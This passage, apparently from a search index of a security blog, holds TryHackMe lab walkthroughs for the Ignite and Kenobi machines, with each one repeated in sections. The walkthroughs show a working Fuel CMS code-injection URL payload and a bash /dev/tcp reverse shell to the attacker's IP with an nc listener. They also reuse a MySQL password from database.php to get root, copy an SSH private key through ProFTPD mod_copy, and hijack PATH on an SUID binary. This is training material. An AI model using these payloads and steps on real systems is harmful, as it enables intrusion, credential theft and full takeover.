80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/fuel/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Welcome to FUEL CMS Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.48 seconds Fuel CMS 1.4 The home page at port 80 is Fuel CMS version 1.4 At robots.txt , I saw an uri /fuel/ \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.3:22.2]~/walkthrough/tryhackme/ignite \u2514\u2500$ curl http://10.10.105.151/robots.txt User-agent: * Disallow: /fuel/ Go to this page, I saw an login page. Try to login with common credential admin:admin , I got admin page. Search public exploit for Fuel CMS 1.4, there are 2 RCE exploit at searchsploit . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.2:21.6]~/walkthrough/tryhackme/ignite \u2514\u2500$ searchsploit Fuel CMS 1.4 ------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------- --------------------------------- fuel CMS 1.4.1 - Remote Code Execution (1) | linux/webapps/47138.py Fuel CMS 1.4.1 - Remote Code Execution (2) | php/webapps/49487.rb Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated) | php/webapps/48741.txt Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authentica | php/webapps/48778.txt ------------------------------------------------------------- --------------------------------- Shellcodes: No Results Foothold Inject Code Execution Follow exploit linux/webapps/47138.py , I know that the exploit call system and run injected command in the system. http://10.10.105.151/fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27id%27)%2b%27 Try to sent id command using curl and I confirm this payload was executed. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.6:23.8]~/walkthrough/tryhackme/ignite \u2514\u2500$ curl --silent 'http://10.10.105.151/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27id%27%29%2b%27' | grep www-data systemuid=33(www-data) gid=33(www-data) groups=33(www-data) </div>systemuid=33(www-data) gid=33(www-data) groups=33(www-data) <snip> Using the same method to execute reverse shell to kali machine \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:22.3]~/walkthrough/tryhackme/ignite \u2514\u2500$ hURL -U 'bash -c \"sh -i >& /dev/tcp/10.11.32.198/443 0>&1\"' Original :: bash -c \"sh -i >& /dev/tcp/10.11.32.198/443 0>&1\" URL ENcoded :: bash%20-c%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.32.198%2F443%200%3E%261%22 \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:22.3]~/walkthrough/tryhackme/ignite \u2514\u2500$ cmd=bash%20-c%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.32.198%2F443%200%3E%261%22 \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:22.3]~/walkthrough/tryhackme/ignite \u2514\u2500$ curl \"http://10.10.105.151/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27$cmd%27%29%2b%27\" At the listener, I got reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.7:23.9]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.105.151] 32810 sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Privilege Escalation Mysql Password to Root After enum local machine, I found file database.php contain database password. www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php <snip> 'hostname' => 'localhost', 'username' => 'root', 'password' => 'mememe', 'database' => 'fuel_schema', 'dbdriver' => 'mysqli', I enum database with knowed credential, but there are no value infomation in there. But when I try to login to root with same mysql's password: mememe , I got root access. www-data@ubuntu:/var/www/html/fuel/application/config$ su Password: root@ubuntu:/var/www/html/fuel/application/config# id uid=0(root) gid=0(root) groups=0(root)","title":"Ignite"},{"location":"walkthrough/tryhackme/Ignite/index.html#tryhackme-ignite","text":"Author: Hades Scripting here","title":"TryHackMe Ignite"},{"location":"walkthrough/tryhackme/Ignite/index.html#vm-details","text":"Name Ignite Created by DarkStar7471 Date release 864 days old (9/4/2021)","title":"VM Details"},{"location":"walkthrough/tryhackme/Ignite/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/tryhackme/Ignite/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.105.151 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 80 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.105.151 -p80 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 22:50 +07 Nmap scan report for 10.10.105.151 Host is up (0.19s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/fuel/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Welcome to FUEL CMS Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.48 seconds","title":"Openning Services"},{"location":"walkthrough/tryhackme/Ignite/index.html#fuel-cms-14","text":"The home page at port 80 is Fuel CMS version 1.4 At robots.txt , I saw an uri /fuel/ \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.3:22.2]~/walkthrough/tryhackme/ignite \u2514\u2500$ curl http://10.10.105.151/robots.txt User-agent: * Disallow: /fuel/ Go to this page, I saw an login page. Try to login with common credential admin:admin , I got admin page. Search public exploit for Fuel CMS 1.4, there are 2 RCE exploit at searchsploit . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.2:21.6]~/walkthrough/tryhackme/ignite \u2514\u2500$ searchsploit Fuel CMS 1.4 ------------------------------------------------------------- --------------------------------- Exploit Title | Path ------------------------------------------------------------- --------------------------------- fuel CMS 1.4.1 - Remote Code Execution (1) | linux/webapps/47138.py Fuel CMS 1.4.1 - Remote Code Execution (2) | php/webapps/49487.rb Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated) | php/webapps/48741.txt Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authentica | php/webapps/48778.txt ------------------------------------------------------------- --------------------------------- Shellcodes: No Results","title":"Fuel CMS 1.4"},{"location":"walkthrough/tryhackme/Ignite/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/tryhackme/Ignite/index.html#inject-code-execution","text":"Follow exploit linux/webapps/47138.py , I know that the exploit call system and run injected command in the system. http://10.10.105.151/fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27id%27)%2b%27 Try to sent id command using curl and I confirm this payload was executed. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.6:23.8]~/walkthrough/tryhackme/ignite \u2514\u2500$ curl --silent 'http://10.10.105.151/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27id%27%29%2b%27' | grep www-data systemuid=33(www-data) gid=33(www-data) groups=33(www-data) </div>systemuid=33(www-data) gid=33(www-data) groups=33(www-data) <snip> Using the same method to execute reverse shell to kali machine \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:22.3]~/walkthrough/tryhackme/ignite \u2514\u2500$ hURL -U 'bash -c \"sh -i >& /dev/tcp/10.11.32.198/443 0>&1\"' Original :: bash -c \"sh -i >& /dev/tcp/10.11.32.198/443 0>&1\" URL ENcoded :: bash%20-c%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.32.198%2F443%200%3E%261%22 \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:22.3]~/walkthrough/tryhackme/ignite \u2514\u2500$ cmd=bash%20-c%20%22sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.32.198%2F443%200%3E%261%22 \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:22.3]~/walkthrough/tryhackme/ignite \u2514\u2500$ curl \"http://10.10.105.151/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27$cmd%27%29%2b%27\" At the listener, I got reverse shell \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.7:23.9]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.11.32.198] from (UNKNOWN) [10.10.105.151] 32810 sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)","title":"Inject Code Execution"},{"location":"walkthrough/tryhackme/Ignite/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/tryhackme/Ignite/index.html#mysql-password-to-root","text":"After enum local machine, I found file database.php contain database password. www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php <snip> 'hostname' => 'localhost', 'username' => 'root', 'password' => 'mememe', 'database' => 'fuel_schema', 'dbdriver' => 'mysqli', I enum database with knowed credential, but there are no value infomation in there. But when I try to login to root with same mysql's password: mememe , I got root access. www-data@ubuntu:/var/www/html/fuel/application/config$ su Password: root@ubuntu:/var/www/html/fuel/application/config# id uid=0(root) gid=0(root) groups=0(root)","title":"Mysql Password to Root"},{"location":"walkthrough/tryhackme/Kenobi/index.html","text":"TryHackMe Kenobi Author: Hades Scripting here VM Details Name Kenobi Created by tryhackme Date release 583 days old (9/4/2021) Information Gathering Openning Services ### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.66.44 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 21,22,80,111,139,445,2049,42579,43785,45127,60161 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.66.44 -p21,22,80,111,139,445,2049,42579,43785,45127,60161 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 16:30 +07 Nmap scan report for 10.10.66.44 Host is up (0.23s latency). PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA) | 256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA) |_ 256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/admin.html |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100005 1,2,3 34289/tcp6 mountd | 100005 1,2,3 45127/tcp mountd | 100005 1,2,3 46994/udp mountd | 100005 1,2,3 51348/udp6 mountd | 100021 1,3,4 37099/tcp6 nlockmgr | 100021 1,3,4 42579/tcp nlockmgr | 100021 1,3,4 53493/udp6 nlockmgr | 100021 1,3,4 54131/udp nlockmgr | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 2049/tcp open nfs_acl 2-3 (RPC #100227) 42579/tcp open nlockmgr 1-4 (RPC #100021) 43785/tcp open mountd 1-3 (RPC #100005) 45127/tcp open mountd 1-3 (RPC #100005) 60161/tcp open mountd 1-3 (RPC #100005) Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -2s |_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: kenobi | NetBIOS computer name: KENOBI\\x00 | Domain name: \\x00 | FQDN: kenobi |_ System time: 2021-04-09T04:30:44-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-09T09:30:44 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.90 seconds ProFTPD 1.3.5 21 At port 21, I try to login to service ftp with anonymous credential, but it's fail \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:20.0]~ \u2514\u2500$ ftp 10.10.66.44 Connected to 10.10.66.44. 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.66.44] Name (10.10.66.44:kali): anonymous 331 Anonymous login ok, send your complete email address as your password Password: 530 Login incorrect. Login failed. Remote system type is UNIX. Using binary mode to transfer files. ftp> Search public exploit with searchsploit \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:20.0]~ \u2514\u2500$ searchsploit ProFTPD 1.3.5 ------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------ --------------------------------- ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution | linux/remote/36803.py ProFTPd 1.3.5 - File Copy | linux/remote/36742.txt ------------------------------------------------------------ --------------------------------- Shellcodes: No Results Based on 'mod_copy' exploit, it allow copy file to another location in the server without authentication. Apache httpd 2.4.18 At port 80, the home page is showing only an image. But when I enum file robots.txt , I got uri admin.html . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:20.0]~ \u2514\u2500$ curl http://10.10.66.44/robots.txt User-agent: * Disallow: /admin.html At http://10.10.66.44/admin.html is also an image. Server Message Block Enum service SMB with smbmap , it shows folder anonymous can be access by guest with read only permission. ### SMB Enumeration (445) ############################ smbmap -H 10.10.66.44 -u guest [+] Guest session IP: 10.10.66.44:445 Name: 10.10.66.44 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers anonymous READ ONLY IPC$ NO ACCESS IPC Service (kenobi server (Samba, Ubuntu)) Go to folder anonymous in the server and I got file log.txt \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:28.0]~ \u2514\u2500$ smbclient //10.10.66.44/anonymous Enter WORKGROUP\\kali's password: Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Wed Sep 4 17:49:09 2019 .. D 0 Wed Sep 4 17:56:07 2019 log.txt N 12237 Wed Sep 4 17:49:09 2019 <snip> Download file log.txt by using get log.txt and read it. File log.txt show that: User kenobi has generated public/private rsa key and save it to /home/kenobi/.ssh/ \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:27.0]~/walkthrough/tryhackme/kenobi \u2514\u2500$ cat log.txt <snip> Your identification has been saved in /home/kenobi/.ssh/id_rsa. Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub. <snip> Remote Procedure Call ### RPC Enumeration (111) ############################ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.66.44 <snip> PORT STATE SERVICE 111/tcp open rpcbind | nfs-ls: Volume /var <snip> | nfs-showmount: |_ /var * | nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink |_ /var 9204224.0 1842988.0 6870640.0 22% 16.0T 32000 Nmap done: 1 IP address (1 host up) scanned in 3.50 seconds RPC Service shows that folder var was sharing and can be mount. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.9:27.0]~/walkthrough/tryhackme/kenobi \u2514\u2500$ sudo mount 10.10.66.44:/var /mnt/var [sudo] password for kali: \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.9:27.1]~/walkthrough/tryhackme/kenobi \u2514\u2500$ ls /mnt/var backups cache crash lib local lock log mail opt run snap spool tmp www Foothold 'mod_copy' to read ssh I using mod_copy vulnerability in ftp service linux/remote/36742.txt and copy file private key at /home/kenobi/.ssh/id_rsa to folder /var/tmp . ftp> site cpfr /home/kenobi/.ssh/id_rsa 350 File or directory exists, ready for destination name ftp> site cpto /var/tmp/id_rsa 250 Copy successful Check in folder /var/tmp and copy file id_rsa to kali machine. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:27.2]~/walkthrough/tryhackme/kenobi \u2514\u2500$ ls -l /mnt/var/tmp/id_rsa -rw-r--r-- 1 kali kali 1675 Apr 9 17:23 /mnt/var/tmp/id_rsa \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:27.7]~/walkthrough/tryhackme/kenobi \u2514\u2500$ cp /mnt/var/tmp/id_rsa . Using ssh with private key connect to server and got user access. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:27.6]~/walkthrough/tryhackme/kenobi \u2514\u2500$ chmod 600 id_rsa \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:27.6]~/walkthrough/tryhackme/kenobi \u2514\u2500$ ssh -i id_rsa kenobi@10.10.66.44 <snip> kenobi@kenobi:~$ id uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare) Privilege Escalation Path Command Overwrite After enum in local machine, I saw an uncommon file have SUID can run as root. kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null <snip> /usr/bin/menu <snip> kenobi@kenobi:~$ ls -l /usr/bin/menu -rwsr-xr-x 1 root root 8880 Sep 4 2019 /usr/bin/menu Checking string in file menu using strings , I can see some command execute after run file curl , uname and ifconfig . kenobi@kenobi:~$ strings /usr/bin/menu <snip> *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice : curl -I localhost uname -r ifconfig <snip> Let's create file ifconfig contain bash shell execution and save it to folder /tmp kenobi@kenobi:~$ echo sh > /tmp/ifconfig kenobi@kenobi:~$ chmod 777 /tmp/ifconfig Add the folder /tmp to the first PATH kenobi@kenobi:~$ export PATH=/tmp/:$PATH Run file /usr/bin/menu and execute command ifconfig to get root shell kenobi@kenobi:~$ /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice :3 # id uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)","title":"Kenobi"},{"location":"walkthrough/tryhackme/Kenobi/index.html#tryhackme-kenobi","text":"Author: Hades Scripting here","title":"TryHackMe Kenobi"},{"location":"walkthrough/tryhackme/Kenobi/index.html#vm-details","text":"Name Kenobi Created by tryhackme Date release 583 days old (9/4/2021)","title":"VM Details"},{"location":"walkthrough/tryhackme/Kenobi/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/tryhackme/Kenobi/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -Pn -p- --min-rate 1000 10.10.66.44 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. [+] Openning ports: 21,22,80,111,139,445,2049,42579,43785,45127,60161 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.66.44 -p21,22,80,111,139,445,2049,42579,43785,45127,60161 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 16:30 +07 Nmap scan report for 10.10.66.44 Host is up (0.23s latency). PORT STATE SERVICE VERSION 21/tcp open ftp ProFTPD 1.3.5 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA) | 256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA) |_ 256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/admin.html |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn't have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100005 1,2,3 34289/tcp6 mountd | 100005 1,2,3 45127/tcp mountd | 100005 1,2,3 46994/udp mountd | 100005 1,2,3 51348/udp6 mountd | 100021 1,3,4 37099/tcp6 nlockmgr | 100021 1,3,4 42579/tcp nlockmgr | 100021 1,3,4 53493/udp6 nlockmgr | 100021 1,3,4 54131/udp nlockmgr | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 2049/tcp open nfs_acl 2-3 (RPC #100227) 42579/tcp open nlockmgr 1-4 (RPC #100021) 43785/tcp open mountd 1-3 (RPC #100005) 45127/tcp open mountd 1-3 (RPC #100005) 60161/tcp open mountd 1-3 (RPC #100005) Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -2s |_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: kenobi | NetBIOS computer name: KENOBI\\x00 | Domain name: \\x00 | FQDN: kenobi |_ System time: 2021-04-09T04:30:44-05:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-09T09:30:44 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.90 seconds","title":"Openning Services"},{"location":"walkthrough/tryhackme/Kenobi/index.html#proftpd-135-21","text":"At port 21, I try to login to service ftp with anonymous credential, but it's fail \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:20.0]~ \u2514\u2500$ ftp 10.10.66.44 Connected to 10.10.66.44. 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.66.44] Name (10.10.66.44:kali): anonymous 331 Anonymous login ok, send your complete email address as your password Password: 530 Login incorrect. Login failed. Remote system type is UNIX. Using binary mode to transfer files. ftp> Search public exploit with searchsploit \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:20.0]~ \u2514\u2500$ searchsploit ProFTPD 1.3.5 ------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------ --------------------------------- ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution | linux/remote/36803.py ProFTPd 1.3.5 - File Copy | linux/remote/36742.txt ------------------------------------------------------------ --------------------------------- Shellcodes: No Results Based on 'mod_copy' exploit, it allow copy file to another location in the server without authentication.","title":"ProFTPD 1.3.5 21"},{"location":"walkthrough/tryhackme/Kenobi/index.html#apache-httpd-2418","text":"At port 80, the home page is showing only an image. But when I enum file robots.txt , I got uri admin.html . \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:20.0]~ \u2514\u2500$ curl http://10.10.66.44/robots.txt User-agent: * Disallow: /admin.html At http://10.10.66.44/admin.html is also an image.","title":"Apache httpd 2.4.18"},{"location":"walkthrough/tryhackme/Kenobi/index.html#server-message-block","text":"Enum service SMB with smbmap , it shows folder anonymous can be access by guest with read only permission. ### SMB Enumeration (445) ############################ smbmap -H 10.10.66.44 -u guest [+] Guest session IP: 10.10.66.44:445 Name: 10.10.66.44 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers anonymous READ ONLY IPC$ NO ACCESS IPC Service (kenobi server (Samba, Ubuntu)) Go to folder anonymous in the server and I got file log.txt \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:28.0]~ \u2514\u2500$ smbclient //10.10.66.44/anonymous Enter WORKGROUP\\kali's password: Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Wed Sep 4 17:49:09 2019 .. D 0 Wed Sep 4 17:56:07 2019 log.txt N 12237 Wed Sep 4 17:49:09 2019 <snip> Download file log.txt by using get log.txt and read it. File log.txt show that: User kenobi has generated public/private rsa key and save it to /home/kenobi/.ssh/ \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[3.0:27.0]~/walkthrough/tryhackme/kenobi \u2514\u2500$ cat log.txt <snip> Your identification has been saved in /home/kenobi/.ssh/id_rsa. Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub. <snip>","title":"Server Message Block"},{"location":"walkthrough/tryhackme/Kenobi/index.html#remote-procedure-call","text":"### RPC Enumeration (111) ############################ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.66.44 <snip> PORT STATE SERVICE 111/tcp open rpcbind | nfs-ls: Volume /var <snip> | nfs-showmount: |_ /var * | nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink |_ /var 9204224.0 1842988.0 6870640.0 22% 16.0T 32000 Nmap done: 1 IP address (1 host up) scanned in 3.50 seconds RPC Service shows that folder var was sharing and can be mount. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.9:27.0]~/walkthrough/tryhackme/kenobi \u2514\u2500$ sudo mount 10.10.66.44:/var /mnt/var [sudo] password for kali: \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.9:27.1]~/walkthrough/tryhackme/kenobi \u2514\u2500$ ls /mnt/var backups cache crash lib local lock log mail opt run snap spool tmp www","title":"Remote Procedure Call"},{"location":"walkthrough/tryhackme/Kenobi/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/tryhackme/Kenobi/index.html#mod_copy-to-read-ssh","text":"I using mod_copy vulnerability in ftp service linux/remote/36742.txt and copy file private key at /home/kenobi/.ssh/id_rsa to folder /var/tmp . ftp> site cpfr /home/kenobi/.ssh/id_rsa 350 File or directory exists, ready for destination name ftp> site cpto /var/tmp/id_rsa 250 Copy successful Check in folder /var/tmp and copy file id_rsa to kali machine. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:27.2]~/walkthrough/tryhackme/kenobi \u2514\u2500$ ls -l /mnt/var/tmp/id_rsa -rw-r--r-- 1 kali kali 1675 Apr 9 17:23 /mnt/var/tmp/id_rsa \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:27.7]~/walkthrough/tryhackme/kenobi \u2514\u2500$ cp /mnt/var/tmp/id_rsa . Using ssh with private key connect to server and got user access. \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:27.6]~/walkthrough/tryhackme/kenobi \u2514\u2500$ chmod 600 id_rsa \u250c\u2500\u2500(Hades\u327f10.11.32.198)-[2.8:27.6]~/walkthrough/tryhackme/kenobi \u2514\u2500$ ssh -i id_rsa kenobi@10.10.66.44 <snip> kenobi@kenobi:~$ id uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)","title":"'mod_copy' to read ssh"},{"location":"walkthrough/tryhackme/Kenobi/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/tryhackme/Kenobi/index.html#path-command-overwrite","text":"After enum in local machine, I saw an uncommon file have SUID can run as root. kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null <snip> /usr/bin/menu <snip> kenobi@kenobi:~$ ls -l /usr/bin/menu -rwsr-xr-x 1 root root 8880 Sep 4 2019 /usr/bin/menu Checking string in file menu using strings , I can see some command execute after run file curl , uname and ifconfig . kenobi@kenobi:~$ strings /usr/bin/menu <snip> *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice : curl -I localhost uname -r ifconfig <snip> Let's create file ifconfig contain bash shell execution and save it to folder /tmp kenobi@kenobi:~$ echo sh > /tmp/ifconfig kenobi@kenobi:~$ chmod 777 /tmp/ifconfig Add the folder /tmp to the first PATH kenobi@kenobi:~$ export PATH=/tmp/:$PATH Run file /usr/bin/menu and execute command ifconfig to get root shell kenobi@kenobi:~$ /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice :3 # id uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)","title":"Path Command Overwrite"},{"location":"walkthrough/tryhackme/MrRobot/index.html","text":"TryHackMe Mr Robot Author: Hades Scripting here VM Details Name Mr Robot Credit to Leon Johnson Created by ben Date release 864 days old (9/4/2021) 